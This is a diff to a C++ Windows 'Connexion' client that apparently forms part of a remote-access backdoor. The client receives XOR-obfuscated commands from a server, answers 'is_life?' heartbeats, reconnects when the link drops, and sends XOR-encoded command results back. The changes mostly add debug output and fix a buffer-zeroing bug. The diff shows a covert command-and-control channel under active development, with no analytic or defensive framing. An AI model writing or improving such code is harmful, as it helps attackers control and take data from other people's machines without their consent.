@@ -49,21 +49,22 @@ INT Connexion::main()
     INT len_recv=0;    
     BOOL status_destruction = FALSE; //Test if error in Destruction
     
-    while(true)
+    while(TRUE)
     {
         //Sleep(1000);
 
         command = recvSafe(); //Recv safe and decrypt xor
         
         wcout << "command recv: " << command << "<----" <<endl;
-        wcout << "len: " << command.length() << endl;
+        wcout << "command len: " << command.length() << endl;
         
 
         if(command.find(L"is_life?") != wstring::npos)
         {
             ;
             //if find is_life then continue
-            cout << "life baby " << endl;
+            wcout << "life baby " << endl;
+            
         }
 
         else
@@ -194,7 +195,7 @@ wstring Connexion::recvSafe()
     WCHAR buffer[BUFFER_LEN];
     INT len_recv;
     wstring result;
-    ZeroMemory(&buffer, wcslen(buffer));
+    ZeroMemory(&buffer, sizeof(buffer));
 
     len_recv=recv(sock_client,(char *)buffer, sizeof(buffer), 0);
         
@@ -212,13 +213,33 @@ wstring Connexion::recvSafe()
             reConnect();
             return L"";
         }
-        wcout << "len recv: " << len_recv << endl;
+        
        // result.append(buffer, len_recv);
        result = buffer;
     }
-    wcout << "buffer: " << buffer << endl;
-    wcout << "result: " << result << endl;
+    wstring xor_decode = XOREncryption(result);
+    wcout << "\n\n-------------------------------------xor encrypt: "  << endl;
 
+    wcout << "buffer: " << buffer << endl;
+    wcout <<"result: " << result << endl;
+    wcout << "command: " << xor_decode << endl;
+    wcout << "len command: " << result.length() << endl;
+    for(int i=0; i<result.length(); i++)
+    {wcout << "i: " << i << " " << "char: " << result.at(i) << endl;}
+
+    wcout <<"\n\n--------------------------\ntest xor decode:" << endl;
+    
+    
+   
+    for(int i=0; i < xor_decode.length(); i++)
+    {
+        wcout << "i: " << i << " " << xor_decode.at(i) << endl;
+    }
+   
+    wcout << "------------------------\n" << endl;
+   // wcout << "buffer: " << buffer << endl;
+   // wcout << "result: " << result << endl;
+   // wcout << "decrypt xor: " << XOREncryption(result) << endl;
     return XOREncryption(result);
 }
 
@@ -230,7 +251,6 @@ Once the function is finished send "\r\n" to signal to the server that the clien
     INT i=0;
     
     INT size_all_result_of_command = 0;
-    //const wstring end = "\r\n"; //END CONNECTION.
     wstring request;
 
     if(result_of_command.size() >= 1) 
@@ -241,9 +261,10 @@ Once the function is finished send "\r\n" to signal to the server that the clien
             request = XOREncryption(ConvertUtf8ToWide(result_of_command[i]));
     
             send(sock_client, (char *)request.c_str(),  request.length()* sizeof(WCHAR) ,0);
+            
             size_all_result_of_command += request.length();   
+            cout << result_of_command[i] << endl;
             wcout << "len request: " <<  request.length()<< endl;
-            wcout << "len request wchar: " << request.length()* sizeof(WCHAR) << "\n" << endl;
             Sleep(100);   
         }
     }
